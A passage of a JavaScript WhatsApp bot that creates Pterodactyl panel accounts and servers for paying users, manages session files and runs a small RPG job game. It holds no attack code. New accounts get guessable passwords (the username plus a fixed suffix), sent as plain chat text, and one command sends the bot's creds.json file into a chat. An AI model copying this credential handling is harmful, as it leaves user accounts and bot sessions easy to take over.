       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctfffff})
} else if (global.setmenu === "v3") {
ptz.sendMessage(u, {text: ctf})
}

let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "6gb": {
if (!isPremium) return reply(`*Khusus Orang Spesial`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "175"
let disk = "6000"
let email = username + "505@gmail.com"
akunlo = "https://files.catbox.moe/m9g0wk.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctffffff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Your panel account-*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA 1X*
 PLEASE SAVE IT WELL
IF YOUR ACCOUNT DATA IS LOST OWNER
CANNOT SEND YOUR ACCOUNT ANYMORE

[2] *GUARANTEE ONLY 1X* 
 WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS IN PANEL*  
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFF
`

let tekss6 = ctffffff

let msghhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://files.catbox.moe/m9g0wk.jpg', 
     sourceUrl: global.sourceurl,
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss6
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "Veran",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});

if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctffffff})
} else if (global.setmenu === "v3") {
ptz.sendMessage(u, {text: ctf})
}

let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "7gb": {
if (!isPremium) return reply(`Khusus Orang Spesial`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "175"
let disk = "7000"
let email = username + "505@gmail.com"
akunlo = "https://files.catbox.moe/m9g0wk.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctfffffff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Your account panel -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA 1X*
 PLEASE SAVE IT WELL
IF YOUR ACCOUNT DATA IS LOST OWNER
CANNOT SEND YOUR ACCOUNT ANYMORE

[2] *GUARANTEE ONLY 1X* 
 WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS IN PANEL*  
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFF
`

let tekss7 = ctfffffff

let msghhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Veran', 
     thumbnailUrl: 'https://files.catbox.moe/m9g0wk.jpg', 
     sourceUrl: global.sourceurl,
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss7
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "Veran",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if  (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctfffffff})
} else if (global.setmenu === "v3") {
ptz.sendMessage(u, {text: ctf})
}

let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "unli": {
       if (!isPremium) return reply(`Khusus Orang Spesial`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://files.catbox.moe/m9g0wk.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctffffffff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Your panel account-*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA 1X*
 PLEASE SAVE IT WELL
IF YOUR ACCOUNT DATA IS LOST OWNER
CANNOT SEND YOUR ACCOUNT ANYMORE

[2] *GUARANTEE ONLY 1X* 
 WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS IN PANEL*  
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFF
`

let tekss8 = ctffffffff

let msghhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Veran', 
     thumbnailUrl: 'https://files.catbox.moe/m9g0wk.jpg', 
     sourceUrl: global.sourceurl,
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss8
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctffffffff})
} else if (global.setmenu === "v3") {
ptz.sendMessage(u, {text: ctf})
}

let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "8gb": {
if (!isPremium) return reply(`Khusus Orang Spesial`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "200"
let disk = "8000"
let email = username + "505@gmail.com"
akunlo = "https://files.catbox.moe/m9g0wk.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctfffffffff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Your panel account -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA 1X*
 PLEASE SAVE IT WELL
IF YOUR ACCOUNT DATA IS LOST OWNER
CANNOT SEND YOUR ACCOUNT ANYMORE

[2] *GUARANTEE ONLY 1X* 
 WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS IN PANEL*  
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFF
`

let tekss9 = ctfffffffff

let msghhhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://ibb.co/RzjB6pj', 
     sourceUrl: global.sourceurl,
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss9
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "Veran",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if  (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctfffffffff})
} else if (global.setmenu === "v3") {
ptz.sendMessage(u, {text: ctf})
}

let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
    
    case 'delsession':
            case 'clearsession': {
                if (!isCreator) return reply("?")
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Bentar..`
                    if (filteredArray.length == 0) return m.reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    
                    
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    m.reply("Sukses")
                });
            }
            break
        case 'getsession':
                if (!isCreator) return reply("?")
                
                let sesi = fs.readFileSync('./session/creds.json')
                ptz.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
    case 'listcase': {
const listCase = () => {
const code = fs.readFileSync("./message.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}
let teks = `*Total Case*: ${matches.length} \n\n` 
matches.forEach(function (x) {
   teks += "${khasmiring} " + x + "\n"
})
return teks
}
reply(listCase())
}
break
    case 'everyone': 
        if (!isAdmins) return
 ptz.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await ptz.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: 'everyone' 
}
]
}
}
)
   setTimeout(async () => {
           reply(`${pushname} memggunakan ${command} untuk memanggil kalian`)
            }, 1120)
        break    
       

              case 'txt2img': case 'txtimg':{
if (!text) return reply ('Masukan prompt')
try {
let anu = await (await fetch(`https://widipe.com/ai/text2img?text=${text}`))
ptz.sendMessage(m.chat, {image: anu, caption: `Done`},{quoted:fsaluran})
     } catch (e) {
reply('Gagal Convert Gambar') 
}
}
break  

        // Rpg
      

case "kerja":
let kerjaanli = `*Berikut adalah daftar pekerjaan yang tersedia*

${khasmiring} ojek 
${khasmiring} petani 
${khasmiring} pendagang 
${khasmiring} dokter
${khasmiring} kurir 
${khasmiring} hauling
${khasmiring} polisi
`
return ptz.sendPoll(m.chat, kerjaanli, ["guide-rpg","rules-rpg"])      
break

        case "lamar-kerja":
        if (userdb.apajob == true) return m.reply("*_Lu udah kerja_*")
        
        if (!text ||  !['ojek', 'petani', 'pendagang', 'dokter', 'kurir', 'hauling', 'polisi'].includes(text.toLowerCase())) {
   let kerjaan = `⌕ Contoh Penggunaan: ${prefix}${command} kurir

*Berikut adalah daftar pekerjaan yang tersedia*

${khasmiring} ojek 
${khasmiring} petani 
${khasmiring} pendagang 
${khasmiring} dokter
${khasmiring} kurir 
${khasmiring} hauling
${khasmiring} polisi
`
return ptz.sendPoll(m.chat, kerjaan, ["guide-rpg","rules-rpg"])      

}
      
let job = `${text}`
   
   setTimeout(() => {
  let lamarkerja1 = `Kamu telah memilih *${job}* sebagai pekerjaanmu
  
*_<⋄> Tunggulah persetujuan dari pihak perusahaan dalam 1 menit agar diterima untuk bekerja._*`

  reply(lamarkerja1)}, 0)

setTimeout(() => {
  let lamarkerja2 = `Selamat, lamaran kerja kamu telah diterima oleh pihak perusahaan dan sekarang kamu dapat memulai untuk bekerja hari ini.
  
*_<⋄> Ketik *.kerja* untuk melihat detail pekerjaan._*`

  m.reply(lamarkerja2)}, 30000)

setTimeout(() => {
    userdb.job = job
    userdb.apajob = true
}, 1000)          

if (job === "kurir") {
userdb.kurir = true
userdb.apajob = true
} else if (job === "ojek") {
userdb.ojek = true
userdb.apajob = true
} else if (job === "petani") {
userdb.farm = true
userdb.apajob = true
} else if (job === "pendagang") {
userdb.warung = true
userdb.apajob = true
} else if (job === "dokter") {
userdb.dokter = true
userdb.apajob = true
} else if (job === "hauling") {
userdb.hauling = true
userdb.apajob = true
} else if (job === "polisi") { 
userdb.polis = true
userdb.apajob = true
}
console.log("Sun")
        break
        
        case "out-kerja":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja dasar pengangguran_*")
        let caridpnggg = "Apa Kamu Yakin Dengan pilihan ini ?"
        if (!text) return ptz.sendPoll(m.chat, caridpnggg, ["out-kerja Y","out-kerja N"])
         
           if (text === "Y") {
        if (userdb.job === "kurir") {
userdb.kurir = false
userdb.job = "nganggur"
    userdb.apajob = false
    return m.reply("sukses")
} else if (userdb.job === "ojek") {
userdb.ojek = false
userdb.job = "nganggur"
    userdb.apajob = false
    return m.reply("sukses")
} else if (userdb.job === "petani") {
userdb.farm = false
userdb.job = "nganggur"
    userdb.apajob = false
    return m.reply("sukses")
} else if (userdb.job === "pendagang") {
userdb.warung = false
userdb.job = "nganggur"
    userdb.apajob = false
    return m.reply("sukses")
} else if (userdb.job === "dokter") {
userdb.dokter = false
userdb.job = "nganggur"
    userdb.apajob = false
    return m.reply("sukses")
} else if (userdb.job === "hauling") {
userdb.hauling = false
userdb.job = "nganggur"
    userdb.apajob = false
    return m.reply("sukses")
} else if (userdb.job === "polisi") { 
userdb.polis = false
userdb.job = "nganggur"
    userdb.apajob = false
    return m.reply("sukses")
}
        } else if (text === "N") {
        m.reply("Ok")
        }
        break
        
        case "pendagang":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.warung == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        
        m.reply("*`[ PENDAGANG ] :`* Sedang Kerja")
        
        setTimeout(() => {
        m.reply("*`[ PENDAGANG ] :`* .....")
        }, 9500)
        
      //  setTimeout(() => {
        const bs7 = 70000 // randomNomor(70000)
        addMonay(m.sender, bs7)
        m.reply("*`[ PENDAGANG ] :`* Kamu membereskan daganggan dan storan ke bos..\n\n" + `Kamu mendapatkan uang sejumlah ${bs7}`)
     //   }, 9500)
     
        
        break
        
        case "petani":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.farm == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        
        m.reply("*`[ PETANI ] :`* Sedang Kerja")
        
        setTimeout(() => {
        m.reply("*`[ PETANI ] :`* .....")
        }, 9700)
        
       // setTimeout(() => {
        const bs77 = 30000 // randomNomor(30000)
        addMonay(m.sender, bs77)
        m.reply("*`[ PETANI ] :`* Kamu pulang..\n\n" + `Kamu mendapatkan uang sejumlah ${bs77}`)
      //  }, 9500)
     
        
        break
        
        case "dokter":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.dokter == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        
        m.reply("*`[ DOKTER ] :`* Sedang Kerja")
        
        setTimeout(() => {
        m.reply("*`[ DOKTER ] :`* .....")
        }, 9500)
        
     //   setTimeout(() => {
        const bs777 = 30000 // randomNomor(60000)
        addMonay(m.sender, bs777)
        m.reply("*`[ DOKTER ] :`* Kamu pulang..\n\n" + `Kamu mendapatkan uang sejumlah ${bs777}`)
      //  }, 9500)
     
        
        break
        
        case "ojek":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.ojek == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        
        m.reply("*`[ OJEK ] :`* Sedang Kerja")
        
        setTimeout(() => {
        m.reply("*`[ OJEK ] :`* .....")
        }, 9500)
        
    //    setTimeout(() => {
        const bs7777 = 10000 //randomNomor(10000)
        addMonay(m.sender, bs7777)
        m.reply("*`[ OJEK ] :`* Kamu pulang..\n\n" + `Kamu mendapatkan uang sejumlah ${bs7777}`)
     //   }, 9500)
     
        
        break
        
        case "polisi":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.polis == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        
        m.reply("*`[ POLISI ] :`* Sedang Kerja")
        
        setTimeout(() => {
        m.reply("*`[ POLISI ] :`* .....")
        }, 9500)
        
        
        const bs77777 = 1100000 //randomNomor()
        addMonay(m.sender, bs77777)
        m.reply("*`[ POLISI ] :`* Tugasmu Selesai..\n\n" + `Kamu mendapatkan uang sejumlah ${bs77777}`)
        
     
        
        break
        
        
        case "kurir":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.kurir == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        async function kuriiiiii() {
        m.reply("*`[ KURIR ] :`* Jadi kurir paket yo..")
        setTimeout(() => {
        m.reply("*`[ KURIR ] :`* Kamu mengantarkan beberapa paket..")
        }, 5500)
        
        
        m.reply("*`[ KURIR ] :`* ..")
        
        
        setTimeout(() => {
        const bs777777 = 20000 //randomNomor(20000)
        addMonay(m.sender, bs777777)
        m.reply("*`[ KURIR ] :`* Kamu sampai, kamu mengantar ke Costumer..\n\n" + `Kamu mendapatkan uang sejumlah ${bs777777}`)
        }, 4500)
        }
        return kuriiiiii()
        
        break
        
         case "hauling":
          if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.hauling == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        
        m.reply("*`[ HAULING ] :`* Hauling yo..")
        setTimeout(() => {
        m.reply("*`[ HAULING ] :`* Kamu mengantarkan minyak..")
        }, 5500)
        
        
        m.reply("*`[ HAULING ] :`* ..")
       
        
        setTimeout(() => {
        const bs7777777 = 700000  // randomNomor(700000)
        addMonay(m.sender, bs7777777)
        m.reply("*`[ HAULING ] :`* Kamu sampai, kamu mengantar ke Tuan Buas Rei..\n\n" + `Kamu mendapatkan uang sejumlah ${bs7777777}`)
        }, 4500)
        break
        
        
        case "mulung":
        m.reply("*`[ MULUNG ] :`* Mulung yo..")
        setTimeout(() => {
        m.reply("*`[ MULUNG ] :`* Dapat beberapa kaleng & botol..")
        }, 4500)
        
      //  setTimeout(() => {
        m.reply("*`[ MULUNG ] :`* Dapat beberapa kaleng & botol..")
      //  }, 1500)
        
        setTimeout(() => {
        const bs77777777 = 10000 // randomNomor(10000)
        
        addMonay(m.sender, bs77777777)
        m.reply("*`[ MULUNG ] :`* Kamu menjualnya ke Tuan Buas Rei..\n\n" + `Kamu mendapatkan uang sejumlah ${bs77777777}`)
        }, 4500)
        
        break
        
        case "musuh":
        if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun d-terminal*")
         let caridpngp = "*`otomatis di cari musuh`*\n tp / recover.plug, Go - No\n\n.musuh Go"
        if (!text) return ptz.sendPoll(m.chat, caridpngp, ["musuh go","musuh no"])
